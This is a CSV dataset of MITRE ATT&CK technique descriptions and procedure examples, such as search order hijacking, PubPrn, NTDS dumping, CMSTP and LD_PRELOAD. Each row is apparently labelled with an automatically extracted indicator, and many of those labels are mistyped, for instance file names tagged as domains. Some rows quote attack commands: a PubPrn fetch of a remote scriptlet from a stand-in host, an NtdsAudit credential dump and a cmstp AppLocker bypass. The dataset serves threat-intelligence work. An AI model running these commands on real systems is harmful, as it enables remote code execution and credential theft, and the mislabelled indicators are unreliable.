tech_id,tech_name,text,section,ioc,ioc_value
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,domain,net.com
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,path,"/C net user  will execute ""net.com"
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,example.exe
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,cmd.exe
T1574.008,Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.   Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.    [1]       [2]       [3]    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.   For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument  net user . An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then  cmd.exe /C net user  will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.    [4]      Search order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .",Description,file,net.exe
T1090,Proxy,"HARDRAIN  uses the command  cmd.exe /c netsh firewall add portopening TCP 443 ""adp""  and makes the victim machine function as a proxy server.   [19]",Procedure Examples,file,cmd.exe
T1497,Virtualization or Sandbox Evasion,"Metamorfo  has embedded a ""vmdetect.exe"" executable to identify virtual machines at the beginning of execution.   [16]",Procedure Examples,file,vmdetect.exe
T1083,File and Directory Discovery,Cannon  can obtain victim drive information as well as a list of folders in C:\Program Files.   [57],Procedure Examples,path,C:\Program
T1083,File and Directory Discovery,A variant of  Elise  executes  dir C:\progra~1  when initially run.   [105]      [106],Procedure Examples,path,C:\progra
T1083,File and Directory Discovery,FYAnti  can search the  C:\Windows\Microsoft.NET\  directory for files of a specified size.   [120],Procedure Examples,domain,microsoft.net
T1083,File and Directory Discovery,FYAnti  can search the  C:\Windows\Microsoft.NET\  directory for files of a specified size.   [120],Procedure Examples,path,C:\Windows\Microsoft.NET
T1083,File and Directory Discovery,JPIN  can enumerate drives and their types. It can also change file permissions using cacls.exe.   [144],Procedure Examples,file,cacls.exe
T1083,File and Directory Discovery,"Kwampirs  collects a list of files and directories in C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"" .   [162]",Procedure Examples,path,"C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"
T1083,File and Directory Discovery,"Kwampirs  collects a list of files and directories in C:\ with the command  dir /s /a c:\ &gt;&gt; ""C:\windows\TEMP[RANDOM].tmp"" .   [162]",Procedure Examples,path,C:\windows\TEMP
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,ls.py
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,recentfiles.py
T1083,File and Directory Discovery,"SILENTTRINITY  has several modules, such as  ls.py ,  pwd.py , and  recentFiles.py , to enumerate directories and files.   [256]",Procedure Examples,domain,pwd.py
T1083,File and Directory Discovery,Winnti Group  has used a program named ff.exe to search for specific documents on compromised hosts.   [308],Procedure Examples,file,ff.exe
T1049,System Network Connections Discovery,Magic Hound  has used quser.exe to identify existing RDP connections.   [49],Procedure Examples,file,quser.exe
T1049,System Network Connections Discovery,TeamTNT  has run  netstat -anp  to search for rival malware connections.   [82]     TeamTNT  has also used  libprocesshider  to modify  /etc/ld.so.preload .   [83],Procedure Examples,path,/etc/ld.so
T1049,System Network Connections Discovery,TeamTNT  has run  netstat -anp  to search for rival malware connections.   [82]     TeamTNT  has also used  libprocesshider  to modify  /etc/ld.so.preload .   [83],Procedure Examples,domain,ld.so
T1049,System Network Connections Discovery,Threat Group-3390  has used  net use  and  netstat  to conduct internal discovery of systems. The group has also used  quser.exe  to identify existing RDP sessions on a victim.   [84],Procedure Examples,file,quser.exe
T1497.001,System Checks,"Darkhotel  malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with  .Md5.exe , and if the program is executed from the root of the C:\ drive, as well as checks for sandbox-related libraries.   [10]      [11]",Procedure Examples,file,Md5.exe
T1497.001,System Checks,GoldMax  will check if it is being run in a virtualized environment by comparing the collected MAC address to  c8:27:cc:c2:37:5a .   [20]      [21],Procedure Examples,mac-address,c8:27:cc:c2:37:5a
T1497.001,System Checks,"Saint Bot  has run several virtual machine and sandbox checks, including checking if  Sbiedll.dll  is present in a list of loaded modules, comparing the machine name to  HAL9TH  and the user name to  JohnDoe , and checking the BIOS version for known virtual machine identifiers.   [48]",Procedure Examples,file,Sbiedll.dll
T1497.001,System Checks,SodaMaster  can check for the presence of the Registry key  HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe  before proceeding to its main functionality.   [36],Procedure Examples,registry-key,HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe
T1497.001,System Checks,SodaMaster  can check for the presence of the Registry key  HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe  before proceeding to its main functionality.   [36],Procedure Examples,file,VMwareHostOpen.exe
T1059.006,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the  python.exe  interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.   Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",Description,file,python.exe
T1059.006,Python,Kimsuky  has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.   [23]      [24],Procedure Examples,domain,mailfetcher.py
T1059.006,Python,"TRITON  was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag.   [44]",Procedure Examples,file,trilog.exe
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,url,https://mydomain.com/folder/file.sct
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,domain,mydomain.com
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,ip-address,127.0.0.1
T1216.001,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description,file,Cscript.exe
T1046,Network Service Discovery,Chimera  has used the  get -b   -e   -p    command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.   [13],Procedure Examples,file,Get.exe
T1046,Network Service Discovery,"FIN6  used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.   [25]",Procedure Examples,file,osql.exe
T1046,Network Service Discovery,"menuPass  has used tcping.exe, similar to  Ping , to probe port status on systems of interest.   [37]",Procedure Examples,file,tcping.exe
T1546.014,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond  will load any rules from the  /etc/emond.d/rules/  directory and take action once an explicitly defined event takes place.   The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple.emond.plist .   [1]      [2]      [3]      Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.   [1]      [2]      [3]    Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon  service.",Description,path,/sbin/emond  will load any rules from the  /etc/emond.d
T1546.014,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond  will load any rules from the  /etc/emond.d/rules/  directory and take action once an explicitly defined event takes place.   The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple.emond.plist .   [1]      [2]      [3]      Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.   [1]      [2]      [3]    Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  Launch Daemon  service.",Description,path,"/private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple"
T1027.004,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.   [1]      Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a  Phishing . Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.   [2]",Description,file,csc.exe
T1027.004,Compile After Delivery,DarkWatchman  has used the  csc.exe  tool to compile a C# executable.   [4],Procedure Examples,file,csc.exe
T1027.004,Compile After Delivery,MuddyWater  has used the .NET csc.exe tool to compile executables from downloaded C# code.   [1],Procedure Examples,file,csc.exe
T1113,Screen Capture,Carberp  can capture display screenshots with the screens_dll.dll plugin.   [32],Procedure Examples,file,screens_dll.dll
T1113,Screen Capture,"Dragonfly  has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).   [52]      [53]      [54]",Procedure Examples,file,scr.exe
T1113,Screen Capture,MarkiRAT  can capture screenshots that are initially saved as ‘scr.jpg’.   [100],Procedure Examples,file,scr.jpg
T1113,Screen Capture,Rover  takes screenshots of the compromised system's desktop and saves them to  C:\system\screenshot.bmp  for exfiltration every 60 minutes.   [146],Procedure Examples,path,C:\system\screenshot.bmp
T1113,Screen Capture,"SLOTHFULMEDIA  has taken a screenshot of a victim's desktop, named it ""Filter3.jpg"", and stored it in the local directory.   [155]",Procedure Examples,file,Filter3.jpg
T1113,Screen Capture,Trojan.Karagany  can take a desktop screenshot and save the file into  \ProgramData\Mail\MailAg\shot.png .   [165]      [166],Procedure Examples,file,shot.png
T1124,System Time Discovery,Carbon  uses the command  net time \127.0.0.1  to get information the system’s time.   [19],Procedure Examples,ip-address,127.0.0.1
T1003.003,NTDS,APT28  has used the ntdsutil.exe utility to export the Active Directory database for credential access.   [3],Procedure Examples,file,ntdsutil.exe
T1003.003,NTDS,"Chimera  has gathered the SYSTEM registry and ntds.dit files from target systems.   [4]     Chimera  specifically has used the NtdsAudit tool to dump the password hashes of domain users via  msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv  and used ntdsutil to copy the Active Directory database.   [5]",Procedure Examples,file,msadcs.exe
T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.    [1]    CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.   Adversaries may supply CMSTP.exe with INF files infected with malicious commands.    [2]    Similar to  Regsvr32  / ""Squiblydoo"", CMSTP.exe may be abused to load and execute DLLs    [3]     and/or COM scriptlets (SCT) from remote servers.    [4]       [5]       [6]    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.   CMSTP.exe can also be abused to  Bypass User Account Control  and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.    [3]       [5]       [6]",Description,path,"/ ""Squiblydoo"", CMSTP.exe"
T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.    [1]    CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.   Adversaries may supply CMSTP.exe with INF files infected with malicious commands.    [2]    Similar to  Regsvr32  / ""Squiblydoo"", CMSTP.exe may be abused to load and execute DLLs    [3]     and/or COM scriptlets (SCT) from remote servers.    [4]       [5]       [6]    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.   CMSTP.exe can also be abused to  Bypass User Account Control  and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.    [3]       [5]       [6]",Description,file,CMSTP.exe
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,path,/s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,file,cmstp.exe
T1218.003,CMSTP,Cobalt Group  has used the command  cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt  to bypass AppLocker and launch a malicious script.   [7]      [8]      [9],Procedure Examples,path,C:\Users\ADMINI
T1218.003,CMSTP,MuddyWater  has used CMSTP.exe and a malicious INF to execute its  POWERSTATS  payload.   [10],Procedure Examples,file,CMSTP.exe
T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as  LD_PRELOAD  on Linux or  DYLD_INSERT_LIBRARIES  on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.   [1]      [2]      [3]    These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.   [4]      On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the  export  command,  setenv  function, or  putenv  function. Adversaries can also leverage  Dynamic Linker Hijacking  to export variables in a shell or set variables programmatically using higher level syntax such Python’s  os.environ .   On Linux, adversaries may set  LD_PRELOAD  to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.  LD_PRELOAD  can be set via the environment variable or  /etc/ld.so.preload  file.   [1]      [2]    Libraries specified by  LD_PRELOAD  are loaded and mapped into memory by  dlopen()  and  mmap()  respectively.   [5]      [6]       [7]      [8]       On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the  DYLD_INSERT_LIBRARIES  environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.   [9]      [10]      [11]",Description,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as  LD_PRELOAD  on Linux or  DYLD_INSERT_LIBRARIES  on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.   [1]      [2]      [3]    These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.   [4]      On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the  export  command,  setenv  function, or  putenv  function. Adversaries can also leverage  Dynamic Linker Hijacking  to export variables in a shell or set variables programmatically using higher level syntax such Python’s  os.environ .   On Linux, adversaries may set  LD_PRELOAD  to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.  LD_PRELOAD  can be set via the environment variable or  /etc/ld.so.preload  file.   [1]      [2]    Libraries specified by  LD_PRELOAD  are loaded and mapped into memory by  dlopen()  and  mmap()  respectively.   [5]      [6]       [7]      [8]       On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the  DYLD_INSERT_LIBRARIES  environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.   [9]      [10]      [11]",Description,domain,ld.so
T1574.006,Dynamic Linker Hijacking,Hildegard  has modified /etc/ld.so.preload to intercept shared library import functions.   [15],Procedure Examples,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,Hildegard  has modified /etc/ld.so.preload to intercept shared library import functions.   [15],Procedure Examples,domain,ld.so
T1574.006,Dynamic Linker Hijacking,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [16],Procedure Examples,path,/etc/ld.so
T1574.006,Dynamic Linker Hijacking,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [16],Procedure Examples,domain,ld.so
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,domain,finder.app
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,domain,terminal.app
